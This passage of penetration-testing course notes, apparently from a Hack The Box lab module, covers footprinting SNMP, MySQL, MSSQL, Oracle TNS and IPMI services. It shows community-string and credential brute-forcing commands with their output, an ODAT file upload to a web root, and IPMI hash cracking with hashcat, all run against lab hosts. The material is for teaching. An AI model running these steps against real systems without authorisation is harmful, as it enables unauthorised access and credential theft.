iso.3.6.1.2.1.25.6.3.1.2.1243 <span class="o">=</span> STRING: <span class="s2">"python3_3.8.2-0ubuntu2_amd64"</span>
iso.3.6.1.2.1.25.6.3.1.2.1244 <span class="o">=</span> STRING: <span class="s2">"python3-acme_1.1.0-1_all"</span>
iso.3.6.1.2.1.25.6.3.1.2.1245 <span class="o">=</span> STRING: <span class="s2">"python3-apport_2.20.11-0ubuntu27.21_all"</span>
iso.3.6.1.2.1.25.6.3.1.2.1246 <span class="o">=</span> STRING: <span class="s2">"python3-apt_2.0.0ubuntu0.20.04.6_amd64"</span> 

...SNIP...
</code></pre></div></div>

<p>Here we recognize some Python packages that have been installed on the system. If we do not know the community string, we can use <code class="language-plaintext highlighter-rouge">onesixtyone</code> and <code class="language-plaintext highlighter-rouge">SecLists</code> wordlists to identify these community strings.</p>

<h4 id="onesixtyone">OneSixtyOne</h4>

<p>SNMP</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>apt <span class="nb">install </span>onesixtyone
c0derpwner@htb[/htb]<span class="nv">$ </span>onesixtyone <span class="nt">-c</span> /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128

Scanning 1 hosts, 3220 communities
10.129.14.128 <span class="o">[</span>public] Linux htb 5.11.0-37-generic <span class="c">#41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021 x86_64</span>
</code></pre></div></div>

<p>Often, when certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify. However, if we imagine an extensive network with over 100 different servers managed using SNMP, the labels, in that case, will have some pattern to them. Therefore, we can use different rules to guess them. We can use the tool <a href="https://secf00tprint.github.io/blog/passwords/crunch/advanced/en">crunch</a> to create custom wordlists. Creating custom wordlists is not an essential part of this module, but more details can be found in the module <a href="https://academy.hackthebox.com/course/preview/cracking-passwords-with-hashcat">Cracking Passwords With Hashcat</a>.</p>

<p>Once we know a community string, we can use it with <a href="https://github.com/mteg/braa">braa</a> to brute-force the individual OIDs and enumerate the information behind them.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>apt <span class="nb">install </span>braa
c0derpwner@htb[/htb]<span class="nv">$ </span>braa &lt;community string&gt;@&lt;IP&gt;:.1.3.6.<span class="k">*</span>   <span class="c"># Syntax</span>
c0derpwner@htb[/htb]<span class="nv">$ </span>braa public@10.129.14.128:.1.3.6.<span class="k">*</span>

10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic <span class="c">#36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64</span>
10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10
10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548
10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.6.0:US
10.129.14.128:20ms:.1.3.6.1.2.1.1.7.0:78
...SNIP...
</code></pre></div></div>

<p>Once again, we would like to point out that the independent configuration of the SNMP service will bring us a great variety of different experiences that no tutorial can replace. Therefore, we highly recommend setting up a VM with SNMP, experimenting with it, and trying different configurations. SNMP can be a boon for an I.T. systems administrator as well as a curse for Security analysts and managers alike.</p>

<h1 id="mysql">MySQL</h1>

<p>#mysql #mariadb</p>

<hr />

<p><code class="language-plaintext highlighter-rouge">MySQL</code> is an open-source SQL relational database management system developed and supported by Oracle. A database is simply a structured collection of data organized for easy use and retrieval. The database system can quickly process large amounts of data with high performance. Within the database, data storage is done in a manner to take up as little space as possible. The database is controlled using the <a href="https://www.w3schools.com/sql/sql_intro.asp">SQL database language</a>. MySQL works according to the <code class="language-plaintext highlighter-rouge">client-server principle</code> and consists of a MySQL server and one or more MySQL clients. The MySQL server is the actual database management system. It takes care of data storage and distribution. The data is stored in tables with different columns, rows, and data types. These databases are often stored in a single file with the file extension <code class="language-plaintext highlighter-rouge">.sql</code>, for example, like <code class="language-plaintext highlighter-rouge">wordpress.sql</code>.</p>

<h4 id="scanning-mysql-server">Scanning MySQL Server</h4>

<p>MySQL</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>nmap 10.129.14.128 <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p3306</span> <span class="nt">--script</span> mysql<span class="k">*</span>

Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-21 00:53 CEST
Nmap scan report <span class="k">for </span>10.129.14.128
Host is up <span class="o">(</span>0.00021s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE     VERSION
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-brute: 
|   Accounts: 
|     root:&lt;empty&gt; - Valid credentials
|_  Statistics: Performed 45010 guesses <span class="k">in </span>5 seconds, average tps: 9002.0
|_mysql-databases: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
|_mysql-dump-hashes: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
| mysql-empty-password: 
|_  root account has empty password
| mysql-enum: 
|   Valid usernames: 
|     root:&lt;empty&gt; - Valid credentials
|     netadmin:&lt;empty&gt; - Valid credentials
|     guest:&lt;empty&gt; - Valid credentials
|     user:&lt;empty&gt; - Valid credentials
|     web:&lt;empty&gt; - Valid credentials
|     sysadmin:&lt;empty&gt; - Valid credentials
|     administrator:&lt;empty&gt; - Valid credentials
|     webadmin:&lt;empty&gt; - Valid credentials
|     admin:&lt;empty&gt; - Valid credentials
|     <span class="nb">test</span>:&lt;empty&gt; - Valid credentials
|_  Statistics: Performed 10 guesses <span class="k">in </span>1 seconds, average tps: 10.0
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26-0ubuntu0.20.04.1
|   Thread ID: 13
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: YTSgMfqvx<span class="se">\x</span>0F<span class="se">\x</span>7F<span class="se">\x</span>16<span class="se">\&amp;\x</span>1EAeK&gt;0
|_  Auth Plugin Name: caching_sha2_password
|_mysql-users: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
|_mysql-variables: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
MAC Address: 00:00:00:00:00:00 <span class="o">(</span>VMware<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.21 seconds
</code></pre></div></div>

<p>As with all our scans, we must be careful with the results and manually confirm the information obtained because some of the information might turn out to be a false-positive. This scan above is an excellent example of this, as we know for a fact that the target MySQL server does not use an empty password for the user <code class="language-plaintext highlighter-rouge">root</code>, but a fixed password. We can test this with the following command:</p>

<p>MySQL</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>mysql <span class="nt">-u</span> root <span class="nt">-h</span> 10.129.14.132

ERROR 1045 <span class="o">(</span>28000<span class="o">)</span>: Access denied <span class="k">for </span>user <span class="s1">'root'</span>@<span class="s1">'10.129.14.1'</span> <span class="o">(</span>using password: NO<span class="o">)</span>
</code></pre></div></div>

<table>
  <thead>
    <tr>
      <th><strong>Command</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">mysql -u &lt;user&gt; -p&lt;password&gt; -h &lt;IP address&gt;</code></td>
      <td>Connect to the MySQL server. There should <strong>not</strong> be a space between the ‘-p’ flag, and the password.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">show databases;</code></td>
      <td>Show all databases.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">use &lt;database&gt;;</code></td>
      <td>Select one of the existing databases.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">show tables;</code></td>
      <td>Show all available tables in the selected database.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">show columns from &lt;table&gt;;</code></td>
      <td>Show all columns in the selected database.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">select * from &lt;table&gt;;</code></td>
      <td>Show everything in the desired table.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">select * from &lt;table&gt; where &lt;column&gt; = "&lt;string&gt;";</code></td>
      <td>Search for needed <code class="language-plaintext highlighter-rouge">string</code> in the desired table.</td>
    </tr>
  </tbody>
</table>

<hr />

<h1 id="mssql">MSSQL</h1>

<p><a href="https://www.microsoft.com/en-us/sql-server/sql-server-2019">Microsoft SQL</a> (<code class="language-plaintext highlighter-rouge">MSSQL</code>) is Microsoft’s SQL-based relational database management system. Unlike MySQL, which we discussed in the last section, MSSQL is closed source and was initially written to run on Windows operating systems. It is popular among database administrators and developers when building applications that run on Microsoft’s .NET framework due to its strong native support for .NET. There are versions of MSSQL that will run on Linux and MacOS, but we will more likely come across MSSQL instances on targets running Windows.</p>

<h4 id="mssql-clients">MSSQL Clients</h4>

<p><a href="https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15">SQL Server Management Studio</a> (<code class="language-plaintext highlighter-rouge">SSMS</code>) comes as a feature that can be installed with the MSSQL install package or can be downloaded &amp; installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins. Keep in mind that since SSMS is a client-side application, it can be installed and used on any system an admin or developer is planning to manage the database from. It doesn’t only exist on the server hosting the database. This means we could come across a vulnerable system with SSMS with saved credentials that allow us to connect to the database. The image below shows SSMS in action.</p>

<p>MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:</p>

<table>
  <thead>
    <tr>
      <th>Default System Database</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">master</code></td>
      <td>Tracks all system information for an SQL server instance</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">model</code></td>
      <td>Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">msdb</code></td>
      <td>The SQL Server Agent uses this database to schedule jobs &amp; alerts</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">tempdb</code></td>
      <td>Stores temporary objects</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">resource</code></td>
      <td>Read-only database containing system objects included with SQL server</td>
    </tr>
  </tbody>
</table>

<p>Authentication being set to <code class="language-plaintext highlighter-rouge">Windows Authentication</code> means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment. Like with any OS, service, server role, or application, it can be beneficial to set it up in a VM from installation to configuration to understand all the default configurations and potential mistakes that the administrator could make.</p>

<p>This is not an extensive list because there are countless ways MSSQL databases can be configured by admins based on the needs of their respective organizations. We may benefit from looking into the following:</p>

<ul>
  <li>
    <p>MSSQL clients not using encryption to connect to the MSSQL server</p>
  </li>
  <li>
    <p>The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates</p>
  </li>
  <li>
    <p>The use of <a href="https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15">named pipes</a></p>
  </li>
  <li>
    <p>Weak &amp; default <code class="language-plaintext highlighter-rouge">sa</code> credentials. Admins may forget to disable this account</p>
  </li>
</ul>

<h4 id="nmap-mssql-script-scan">NMAP MSSQL Script Scan</h4>

<p>MSSQL</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">--script</span> ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes <span class="nt">--script-args</span> mssql.instance-port<span class="o">=</span>1433,mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>,mssql.instance-name<span class="o">=</span>MSSQLSERVER <span class="nt">-sV</span> <span class="nt">-p</span> 1433 10.129.201.248

Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-08 09:40 EST
Nmap scan report <span class="k">for </span>10.129.201.248
Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00<span class="p">;</span> RTM
| ms-sql-ntlm-info: 
|   Target_Name: SQL-01
|   NetBIOS_Domain_Name: SQL-01
|   NetBIOS_Computer_Name: SQL-01
|   DNS_Domain_Name: SQL-01
|   DNS_Computer_Name: SQL-01
|_  Product_Version: 10.0.17763

Host script results:
| ms-sql-dac: 
|_  Instance: MSSQLSERVER<span class="p">;</span> DAC port: 1434 <span class="o">(</span>connection failed<span class="o">)</span>
| ms-sql-info: 
|   Windows server name: SQL-01
|   10.129.201.248<span class="se">\M</span>SSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: <span class="nb">false</span>
|     TCP port: 1433
|     Named pipe: <span class="se">\\</span>10.129.201.248<span class="se">\p</span>ipe<span class="se">\s</span>ql<span class="se">\q</span>uery
|_    Clustered: <span class="nb">false

</span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>8.52 seconds
</code></pre></div></div>

<h4 id="connecting-with-mssqlclientpy">Connecting with Mssqlclient.py</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
c0derpwner@htb[/htb]<span class="nv">$ </span>impacket-mssqlclient backdoor@10.129.184.227 <span class="nt">-windows-auth</span>

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>SQL-01<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>SQL-01<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>150 7208<span class="o">)</span> 
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands

SQL&gt; <span class="k">select </span>name from sys.databases

name                                                                                                                               

<span class="nt">--------------------------------------------------------------------------------------</span>

master                                                                                                                             

tempdb                                                                                                                             

model                                                                                                                              

msdb
</code></pre></div></div>

<hr />
<h1 id="oracle-tns">Oracle TNS</h1>

<p>The <code class="language-plaintext highlighter-rouge">Oracle Transparent Network Substrate</code> (<code class="language-plaintext highlighter-rouge">TNS</code>) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the <a href="https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html">Oracle Net Services</a> software suite, TNS supports various networking protocols between Oracle databases and client applications, such as <code class="language-plaintext highlighter-rouge">IPX/SPX</code> and <code class="language-plaintext highlighter-rouge">TCP/IP</code> protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.</p>

<p>The default configuration of the Oracle TNS server varies depending on the version and edition of Oracle software installed. However, some common settings are usually configured by default in Oracle TNS. By default, the listener listens for incoming connections on the <code class="language-plaintext highlighter-rouge">TCP/1521</code> port. However, this default port can be changed during installation or later in the configuration file. The TNS listener is configured to support various network protocols, including <code class="language-plaintext highlighter-rouge">TCP/IP</code>, <code class="language-plaintext highlighter-rouge">UDP</code>, <code class="language-plaintext highlighter-rouge">IPX/SPX</code>, and <code class="language-plaintext highlighter-rouge">AppleTalk</code>. The listener can also support multiple network interfaces and listen on specific IP addresses or all available network interfaces. By default, Oracle TNS can be remotely managed in <code class="language-plaintext highlighter-rouge">Oracle 8i</code>/<code class="language-plaintext highlighter-rouge">9i</code> but not in Oracle 10g/11g.</p>

<h4 id="testing-odat">Testing ODAT</h4>

<p>Oracle TNS</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>./odat.py <span class="nt">-h</span>

usage: odat.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">--version</span><span class="o">]</span>
               <span class="o">{</span>all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean<span class="o">}</span>
               ...

            _  __   _  ___ 
           / <span class="se">\|</span>  <span class="se">\ </span>/ <span class="se">\|</span>_ _|
          <span class="o">(</span> o <span class="o">)</span> o <span class="o">)</span> o <span class="o">||</span> | 
           <span class="se">\_</span>/|__/|_n_||_| 
<span class="nt">-------------------------------------------</span>
  _        __           _           ___ 
 / <span class="se">\ </span>     |  <span class="se">\ </span>        / <span class="se">\ </span>        |_ _|
<span class="o">(</span> o <span class="o">)</span>       o <span class="o">)</span>         o |         | | 
 <span class="se">\_</span>/racle |__/atabase |_n_|ttacking |_|ool 
<span class="nt">-------------------------------------------</span>

By Quentin Hardy <span class="o">(</span>quentin.hardy@protonmail.com or quentin.hardy@bt.com<span class="o">)</span>
...SNIP...
</code></pre></div></div>

<p>Oracle Database Attacking Tool (<code class="language-plaintext highlighter-rouge">ODAT</code>) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.</p>

<p>Let’s now use <code class="language-plaintext highlighter-rouge">nmap</code> to scan the default Oracle TNS listener port.</p>

<h4 id="nmap">Nmap</h4>

<p>Oracle TNS</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-p1521</span> <span class="nt">-sV</span> 10.129.204.235 <span class="nt">--open</span>

Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-06 10:59 EST
Nmap scan report <span class="k">for </span>10.129.204.235
Host is up <span class="o">(</span>0.0041s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 <span class="o">(</span>unauthorized<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>6.64 seconds
</code></pre></div></div>
<h4 id="nmap---sid-bruteforcing">Nmap - SID Bruteforcing</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-p1521</span> <span class="nt">-sV</span> 10.129.204.235 <span class="nt">--open</span> <span class="nt">--script</span> oracle-sid-brute

Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-06 11:01 EST
Nmap scan report <span class="k">for </span>10.129.204.235
Host is up <span class="o">(</span>0.0044s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 <span class="o">(</span>unauthorized<span class="o">)</span>
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>55.40 seconds
</code></pre></div></div>

<p>We can use the <code class="language-plaintext highlighter-rouge">odat.py</code> tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the <code class="language-plaintext highlighter-rouge">all</code> option and try all modules of the <code class="language-plaintext highlighter-rouge">odat.py</code> tool.</p>

<h4 id="odat">ODAT</h4>

<p>Oracle TNS</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>./odat.py all <span class="nt">-s</span> 10.129.204.235

<span class="o">[</span>+] Checking <span class="k">if </span>target 10.129.204.235:1521 is well configured <span class="k">for </span>a connection...
<span class="o">[</span>+] According to a <span class="nb">test</span>, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

<span class="o">[!]</span> Notice: <span class="s1">'mdsys'</span> account is locked, so skipping this username <span class="k">for </span>password           <span class="c">#####################| ETA:  00:01:16 </span>
<span class="o">[!]</span> Notice: <span class="s1">'oracle_ocm'</span> account is locked, so skipping this username <span class="k">for </span>password       <span class="c">#####################| ETA:  00:01:05 </span>
<span class="o">[!]</span> Notice: <span class="s1">'outln'</span> account is locked, so skipping this username <span class="k">for </span>password           <span class="c">#####################| ETA:  00:00:59</span>
<span class="o">[</span>+] Valid credentials found: scott/tiger. Continue...

...SNIP...
</code></pre></div></div>

<p>As istance we found valid credentials for the user <code class="language-plaintext highlighter-rouge">scott</code> and his password <code class="language-plaintext highlighter-rouge">tiger</code>. After that, we can use the tool <code class="language-plaintext highlighter-rouge">sqlplus</code> to connect to the Oracle database and interact with it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>sqlplus scott/tiger@10.129.204.235/XE

SQL<span class="k">*</span>Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright <span class="o">(</span>c<span class="o">)</span> 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL&gt; 
</code></pre></div></div>

<h4 id="oracle-rdbms---file-upload">Oracle RDBMS - File Upload</h4>

<p>Oracle TNS</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"Oracle File Upload Test"</span> <span class="o">&gt;</span> testing.txt
c0derpwner@htb[/htb]<span class="nv">$ </span>./odat.py utlfile <span class="nt">-s</span> 10.129.204.235 <span class="nt">-d</span> XE <span class="nt">-U</span> scott <span class="nt">-P</span> tiger <span class="nt">--sysdba</span> <span class="nt">--putFile</span> C:<span class="se">\\</span>inetpub<span class="se">\\</span>wwwroot testing.txt ./testing.txt

<span class="o">[</span>1] <span class="o">(</span>10.129.204.235:1521<span class="o">)</span>: Put the ./testing.txt <span class="nb">local </span>file <span class="k">in </span>the C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
<span class="o">[</span>+] The ./testing.txt file was created on the C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot directory on the 10.129.204.235 server like the testing.txt file
</code></pre></div></div>

<hr />

<h1 id="ipmi">IPMI</h1>

<p>#ipmi</p>

<p><a href="https://www.thomas-krenn.com/en/wiki/IPMI_Basics">Intelligent Platform Management Interface</a> (<code class="language-plaintext highlighter-rouge">IPMI</code>) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host’s BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system’s hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host. IPMI is typically used in three ways:</p>

<ul>
  <li>Before the OS has booted to modify BIOS settings</li>
  <li>When the host is fully powered down</li>
  <li>Access to a host after a system failure</li>
</ul>

<h4 id="nmap-1">Nmap</h4>

<p>IPMI</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">--script</span> ipmi-version <span class="nt">-p</span> 623 ilo.inlanfreight.local

Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-04 21:48 GMT
Nmap scan report <span class="k">for </span>ilo.inlanfreight.local <span class="o">(</span>172.16.2.2<span class="o">)</span>
Host is up <span class="o">(</span>0.00064s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A <span class="o">(</span>Hewlett Packard Enterprise<span class="o">)</span>

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>0.46 seconds
</code></pre></div></div>

<p>NB:
<em>The short version: the RAKP protocol in the IPMI specification allows anyone to use IPMI commands to grab a HMAC IPMI password hash that can be cracked offline. Longer explanation follows. Here’s a <a href="http://fish2.com/ipmi/tools/rak-the-ripper.pl">little Perl program</a> that implements it.</em></p>

<p>I guess you can file this in the … “well, I don’t think there are enough problems with IPMI with this new spec… what else can we do to sabatoge its security?”</p>

<p>Prior to IPMI 2.0 the IPMI specs would encapsulate IP packets using the Remote Management Control Protocol (RMCP.) For 2.0 I can only surmise that they wanted to continue avoid sending the password over the network (at least, most, or some of the time, depending on options), so they introduce RMCP+, which offers “enhanced authentication” and extends IPMI over IP.</p>

<p>Thus RAKP - the RMCP+ Authenticated Key-Exchange Protocol - was born. According to the specification (page 161):</p>

<blockquote>
  <p><em>RAKP-HMAC-SHA1 uses pre-shared symmetric keys and HMAC-based integrity algorithms to mutually authenticate a remote console to a given managed system and to generate pair-wise unique symmetric keying material that can be used with a number of integrity and confidentiality algorithms to provide protection for RMCP messages.</em></p>
</blockquote>

<p>That sounds pretty good - so how does this work? As an illustration as to its underpinnings, an easy way to trigger RAKP is to use <em>ipmitool</em> like below (the “chassis identify” in the example simply asks the BMC to say what it’s identify interval is) - you might note that the password given (“fluffy-wuffy”) is invalid, but it doesn’t matter, as we’re just starting up RAKP, we’re not interested in finishing it, and ipmitool requires some password, even if it’s wrong:</p>

<p>$ <strong>ipmitool -I lanplus -v -v -v -U ADMIN -P fluffy-wuffy -H 10.0.0.1 chassis identify</strong></p>

<h2 id="dangerous-settings-4">Dangerous Settings</h2>

<p>If default credentials do not work to access a BMC, we can turn to a <a href="http://fish2.com/ipmi/remote-pw-cracking.html">flaw</a> in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user’s password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using <code class="language-plaintext highlighter-rouge">Hashcat</code> mode <code class="language-plaintext highlighter-rouge">7300</code>. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command <strong><code class="language-plaintext highlighter-rouge">hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u</code></strong> which tries all combinations of upper case letters and numbers for an eight-character password</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- [ Built-in Charsets ] -  
  
 ? | Charset  
===+=========  
 l | abcdefghijklmnopqrstuvwxyz [a-z]  
 u | ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]  
 d | 0123456789                 [0-9]  
